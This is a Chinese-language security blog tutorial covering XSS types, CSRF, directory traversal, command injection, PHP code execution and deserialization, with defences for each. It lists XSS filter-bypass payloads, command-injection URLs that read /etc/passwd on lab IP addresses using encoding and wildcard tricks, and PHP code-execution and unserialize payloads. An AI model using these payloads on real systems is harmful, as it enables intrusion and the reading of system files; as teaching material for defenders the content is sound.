<p>       用法：<br>        访问http://www.asd.com/index.php?name=";alert(xss)//<br>        访问成功会弹出一个框。<br>        注：";用于闭合前面的参数，式传入的变量为空，后面的 // 是注释后面的传参本身的“；<br>        注：DOM型XSS的数据流向是 ：URL—&gt;浏览器。<br>        还有一些其它类型的闭合：”&gt;&lt;alter(‘xss’)&gt;&lt;“ ;<br> <br><br> <strong>2.存储型：</strong><br><br>        这种类型的XSS，危害比前一种大得多。它的相关源代码存放于服务器，如果在网站留言的地方加入代码，网站对这些代码没有过滤或过滤不严，那么用户访问该页面的时候就会触发代码执行。容易造成蠕虫，盗窃cookie。<br>        用法：在一个网站的留言板上输入alert(document.cookie),当读到document.cookie时，会得到cookie。<br>        存储型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器。<br> <br><br> <strong>3.反射型：</strong><br>        非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。它的特点是旨在用户单击时触发，而且只执行一次，非持久化，所以称为反射型跨站式脚本。<br>        一般来说这种类型的XSS，需要攻击者提前构造一个恶意链接，来诱使客户点击，比如<code>http://www.abc.com/?params=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>。<br> 反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器。<br>        注：在易用上，存储型XSS &gt; DOM 型 XSS &gt; 反射型 XSS。<br>        反射型XSS和DOM型XSS都需要在url加入js代码才能够触发。<br> <br><br> <strong>4、防御XSS攻击</strong><br><br>        1、使用XSS Filter：<br>        XSS Filter的作用是过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果。<br><br>        2、定制过滤策略<br>        业内防御跨站脚本攻击的方式一般有两种： Input Filtering和 Output Filtering，即分别在输入端（Input）和输出端（Output）进行过滤。<br>        输入过滤：在数据存进数据库之前便对特殊的字符进行转义，方便简洁，顺便可以把SQL注入等其他漏洞一并检验。而缺点就是无法处理之前已经存在于数据库中的恶意代码。<br>        输出过滤：在数据输出之前先对部分敏感字符进行转义，这是一个很安全的方法，能有效保持数据的完整性。缺点是必须对每一个细节的输出仔细过滤，因此会带来额外的工作量。<br><br>        3、防范基于DOM的XSS攻击要注意两点。<br>        （1）避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务端使用动态页面来实现。<br>        （2）分析和强化客户端 Javascript代码，尤其是一些受到用户影响的Dom对象。<br>        另外，要注意能直接修改DOM和创建HTML文件的相关函数和方法。<br>        此外，在把变量输出到页面时要做好相关的编码转义工作。如要输出到<code>&lt;script&gt;</code>中，可以进行JavaScript编码；要输出到HTML内容或属性，则进行HTML编码处理。需要根据不同的语境采用不同的编码处理方式。<br> <br><br></p> 
<p>       4、在同源策略规范下， Cookie理应只能提供给同源下的网页读取使用，然而透过XSS漏洞，攻击者可以利用JavaScript中的 document.cookie方法窃取用户的Cookie。唯一能解决该问题的办法就是使用HttpOnly Cookie。通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。<br>         XMLHttpRequest不能跨域访问资源。但是有跨域请求的需求，因此W3C指定了XMLHttpRequest的跨域访问标准。它需要通过目标域返回的Http头来授权是否允许跨域访问，因此HTTP头对于JavaScript来说一般是无法控制的，所以认为这个方案是可行的。<br>        注意：这个跨域访问方案的安全基础就是信任“Javascript无法控制该HTTP头”，如果此信任基础被打破，则此方案也就不再安全。<br><br>        5、Noscript是一款免费的开源插件，提供对 Firefox、 Seamonkey和其他基于 Mozilla浏览器的额外保护。该插件默认禁止所有脚本，但可以通过自定义设置允许通过的脚本。<br><br>        6、WAF（ Web Application Firewall）指Web应用防护系统或Web应用防火墙，是专门为保护基于Web的应用程序而设计的，主要的功能是防范诸如网页木马、XSS以及CSRF等常见的Web漏洞攻击，在企业环境中深受欢迎。</p> 
<br> 
<p><strong>5、xss字符绕过方法</strong><br> <br></p> 
<pre><code class="prism language-sql"><span class="token number">1</span>、XSS大小写绕过：改变测试语句的大小写来绕过XSS规则
<span class="token operator">&lt;</span>sReipt<span class="token operator">&gt;</span><span class="token keyword">alTer</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>srEipt<span class="token operator">&gt;</span>
<span class="token number">2</span>、黑名单绕过：如果 、<span class="token punctuation">(</span> 、<span class="token punctuation">)</span> 都是属于黑名单中
可以使用html实体编码绕过
<span class="token number">3</span>、通过闭合标签绕过<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token keyword">alter</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token comment">//</span>
<span class="token number">4</span>、如果过滤<span class="token operator">&lt;</span>srcipt<span class="token operator">&gt;</span>、<span class="token operator">&lt;</span><span class="token operator">/</span>srcipt<span class="token operator">&gt;</span> 。那么可以改为<span class="token operator">&lt;</span>scr<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>ipt<span class="token operator">&gt;</span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>src<span class="token operator">&lt;</span><span class="token operator">/</span>srcipt<span class="token operator">&gt;</span>ipt<span class="token operator">&gt;</span>
<span class="token number">5</span>、如果<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token keyword">alter</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>被过滤。那么可以改为<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span><span class="token string">"ANY"</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
<span class="token number">6</span>、可以通过对script双写绕过，<span class="token operator">&lt;</span>scrscriptipt<span class="token operator">&gt;</span><span class="token keyword">alter</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrscriptipt<span class="token operator">&gt;</span>
<span class="token number">7</span>、onclick触发： <span class="token operator">&lt;</span>a herf<span class="token operator">=</span><span class="token string">"x"</span> onclick<span class="token operator">=</span><span class="token string">"alert(/xss/)"</span><span class="token operator">&gt;</span>test<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token number">8</span>、<span class="token string">' οnchange=alter`1` '</span>
<span class="token number">9</span>、<span class="token string">" οnchange=alter`1`//
10、"</span><span class="token operator">&gt;</span> <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:%61lert(1)"</span><span class="token operator">&gt;</span>click me<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span> <span class="token comment">// 使用"&gt;来闭合input标签，然后通过a href写入一个带有xss注入的JavaScript语句形成的超链接，名为click me。最后使用//用于注释掉原有的"&gt;。</span>
<span class="token number">11</span>、<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>eval<span class="token punctuation">(</span>String<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>。
</code></pre> 
<br> 
<h3><a id="CSRF_308"></a><strong>六、CSRF</strong></h3> 
<p>       在跨站请求伪造（CSRF）攻击里面，攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。而浏览器的安全策略是允许当前页面发送到任何地址的请求，因此也就意味着当用户在浏览他/她无法控制的资源时，攻击者可以控制页面的内容来控制浏览器发送它精心构造的请求。CSRF-GET型与CSRF POST型攻击<br><br></p> 
<p>       防御CSRF攻击：<br><br>        1、验证 HTTP Referer 字段，因为这个字段记录着http请求的来源地址。<br><br>        2、在请求地址中添加 token 并验证：用户在登录网站后，会产生一个token存在session之中。当服务器收到请求后，会把token从session中拿出来和请求中携带的token匹配。不匹配则被服务器认为是CSRF攻击。<br><br>        3、在 HTTP 头中自定义属性并验证： 这种方法也是用token并进行验证，通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token值放入其中。</p> 
<br> 
<h3><a id="_321"></a><strong>七、目录遍历漏洞</strong></h3> 
<p>       目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以使web根目录以外的文件），甚至执行系统命令。<br></p> 
<br> 
<p>1、<strong>IIS目录遍历漏洞</strong><br><br>        攻击者利用目录遍历漏洞访问合法应用之外的数据或文件目录，导致数据泄露或被篡改。iis目录遍历漏洞之所以会有是因为在网站的属性里面的主目录里的目录浏览启动了，只要把它关掉就行。<br><br> 2、<strong>apache目录遍历漏洞</strong><br><br>        当攻击者在客户端访问到一个目录时，Apache服务器将会默认寻找一个index list中的文件，若文件不存在，则会列出当前目录下所有文件或返回403状态码，而列出目录下所有文件的行为称为目录遍历。<br>        在apache的配置文件httpd.conf中第255行Options +Indexes +FollowSymLinks +ExeCGI，把+Indexes的’+‘变’-‘就可以了。</p> 
<br> 
<h3><a id="_336"></a><strong>八、命令执行漏洞</strong></h3> 
<p>       当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。<br><br>        命令执行漏洞是直接操作系统的命令。代码执行漏洞是通过代码执行来执行计算机语言代码。<br><br></p> 
<p>1、<strong>命令执行漏洞的防御</strong><br><br>        1、Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如’转义为’,"转义为"等等。<br><br>        2、将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录中，并使用safe_mode_exec_dir指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。<br><br>        3、尽量使用自定义函数或函数库实现外部应用程序或命令的功能。 在执行system、eval等命令执行功能的函数前，要先确定参数内容。<br></p> 
<p>2、<strong>命令执行漏洞绕过</strong><br></p> 
<pre><code class="prism language-sql">命令执行漏洞空格绕过
http:<span class="token comment">//192.168.199.137/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd</span>
或http:<span class="token comment">//192.168.41.23/exec/02.php?ip=127.0.0.1;cat${IFS}/etc/passwd</span>

命令执行漏洞关键命令绕过
http:<span class="token comment">//192.168.199.137/exec/03.php?ip=127.0.0.1;c\at /etc/passwd</span>
或http:<span class="token comment">//192.168.41.23/exec/03.php?ip=127.0.0.1;ca''t /etc/passwd</span>
命令执行漏洞通配符绕过
http:<span class="token comment">//192.168.199.137/exec/04.php?ip=127.0.0.1;cat /*/????wd</span>

命令执行漏洞base64编码绕过
http:<span class="token comment">//192.168.41.71/exec/05.php?ip=127.0.0.1;`echo Y2F0 | base64 -d` /etc/passwd</span>
</code></pre> 
<br> 
<h3><a id="_365"></a><strong>九、代码执行漏洞</strong></h3> 
<p>       代码执行漏洞是通过代码执行来执行计算机语言代码。<br><br>        php代码注入漏洞造成的主要原因是过滤不严格，造成恶意代码被执行。该漏洞主要是函数的参数过滤不严格所致，严重时可以直接写入webshell。<br><br>        PHP中的代码执行情况非常灵活，究其原因仍然离不开两个关键条件：第一是用户能够控制的函数输入；第二是存在可以执行代码的危险函数。<br><br>        PHP中有不少可以直接执行代码的函数，比如：eval()、assert()、system()、exec()、shell_exec()、passthru()、escapeshellcmd()、pcntl_exec()等。当用户能控制这些函数中的参数时，可以将字符串代表的代码作为PHP代码执行。比如eval(system(‘set’);）。<br> <br></p> 
<pre><code class="prism language-sql">代码执行漏洞eval函数示例
<span class="token operator">/</span><span class="token number">01.</span>php
POST参数:<span class="token number">1</span><span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

代码执行漏洞assert函数示例
<span class="token operator">/</span><span class="token number">02.</span>php
POST参数:<span class="token number">1</span><span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

代码执行漏洞call_user_func函数示例
<span class="token operator">/</span><span class="token number">03.</span>php
POST参数:fun<span class="token operator">=</span>system<span class="token operator">&amp;</span>arg<span class="token operator">=</span>id<span class="token punctuation">;</span>

代码执行漏洞call_user_func_array函数示例
<span class="token operator">/</span><span class="token number">04.</span>php
POST参数:fun<span class="token operator">=</span>system<span class="token operator">&amp;</span>arg<span class="token operator">=</span>id<span class="token punctuation">;</span>

代码执行漏洞create_function函数示例
<span class="token operator">/</span><span class="token number">05.</span>php?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>}phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span>

代码执行漏洞array_map函数示例
<span class="token operator">/</span><span class="token number">06.</span>php?func<span class="token operator">=</span>system<span class="token operator">&amp;</span>argv<span class="token operator">=</span>id

代码执行漏洞preg_replace漏洞函数示例
<span class="token operator">/</span><span class="token number">07.</span>php?name<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<br> 
<h3><a id="_402"></a><strong>十、反序列化漏洞</strong></h3> 
<p>       在程序中为了有效地存储后传递数据，又不丢失其类型和结构，经常需要用到序列化和反序列化的函数对数据进行处理。<br><br>        PHP序列化：返回字符串，此字符串包含了表示value的字节流，可以存储在任何地方。<br><br>        PHP反序列化：对单一的已经序列化的变量进行操作，将其转换回原来的值。<br></p> 
<p>下面是对对象的序列化。<br><br> <br></p> 
<p><img src="https://images2.imgbox.com/fd/cb/tV7SMqHK_o.png" alt="在这里插入图片描述"><br><br>        这张图里面的程序加上&lt;?php phpinfo();?&gt;序列话之后是O:1:%22a%22:1:{s:4:%22test%22;s:18:%22%3C?php%20phpinfo();?%3E%22;}<br><br>        url加入构造的序列化http://192.168.199.137/unserialize/01/index.php?re=O:1:%22a%22:1:{s:4:%22test%22;s:18:%22%3C?php%20phpinfo();?%3E%22;}成功执行后，就会执行&lt;?php phpinfo();?&gt;这条命令。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/9df306f03daedccf83f5e2983dbb5422/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">MySql</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/0e3e8fbc9d8174d5884793ac1bbe1b2f/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">[picoVR]曲面UIcurved UI 2.8</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>